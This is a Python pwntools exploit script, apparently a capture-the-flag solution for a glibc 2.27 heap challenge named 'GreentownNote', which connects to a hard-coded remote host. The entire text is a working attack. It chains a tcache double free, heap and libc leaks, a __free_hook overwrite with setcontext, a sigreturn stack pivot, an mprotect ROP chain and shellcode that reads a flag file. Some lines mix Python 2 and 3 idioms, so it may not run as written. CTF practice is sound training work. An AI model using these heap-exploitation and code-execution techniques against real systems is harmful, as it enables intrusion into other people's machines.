from pwn import*

ip = "82.157.5.28"
port = 50601
r = remote(ip,port)
elf = ELF('./GreentownNote')
libc = ELF('./libc-2.27.so')
context(os='linux',arch='amd64')


def choice(c):
    r.recvuntil(":")
    r.sendline(str(c))

def add(size,content):
    choice(1)
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def show(index):
    choice(2)
    r.recvuntil(":")
    r.sendline(str(index))

def free(index):
    choice(3)
    r.recvuntil(":")
    r.sendline(str(index))



add(0x100,b'AAAA')
add(0x100,b'')

free(0)
free(0)
show(0)

r.recvuntil("Content: ")
leak = u64(r.recv(6).ljust(8,b'\x00'))
heap_addr = leak - 0x260
success(hex(heap_addr))

add(0x100,p64(heap_addr+0x10))
add(0x100,'AAA')
add(0x100,'\x07'*0x40)

free(3)
show(3)
leak = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base = leak - 96 - 0x10 - libc.sym['__malloc_hook']
fh = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
setcontext = libc.sym['setcontext'] + libc_base +53
syscall = next(libc.search(asm("syscall\nret")))+libc_base
success(hex(leak))
success(hex(libc_base))
add(0x100,b'\x07'*0x80+p64(fh))
add(0x90,p64(setcontext))

fake_rsp = fh&0xfffffffffffff000
print(hex(fake_rsp))
frame = SigreturnFrame()
frame.rax=0
frame.rdi=0
frame.rsi=fake_rsp
frame.rdx=0x2000
frame.rsp=fake_rsp
frame.rip=syscall
print(len(frame))
add(0xf8,str(frame))
free(5)
prdi_ret = libc_base+libc.search(asm("pop rdi\nret")).next()
prsi_ret = libc_base+libc.search(asm("pop rsi\nret")).next()
prdx_ret = libc_base+libc.search(asm("pop rdx\nret")).next()
prax_ret = libc_base+libc.search(asm("pop rax\nret")).next()
jmp_rsp = libc_base+libc.search(asm("jmp rsp")).next()
mprotect_addr = libc_base + libc.sym['mprotect']


payload = p64(prdi_ret)+p64(fake_rsp)
payload += p64(prsi_ret)+p64(0x1000)
payload += p64(prdx_ret)+p64(7)
payload += p64(prax_ret)+p64(10)
payload += p64(syscall) #mprotect(fake_rsp,0x1000,7)
payload += p64(jmp_rsp)
payload += asm(shellcraft.open('./flag'))
payload += asm(shellcraft.read(3,fake_rsp+0x300,0x100))
payload += asm(shellcraft.write(1,fake_rsp+0x300,0x100))
r.sendline(payload)

r.interactive()

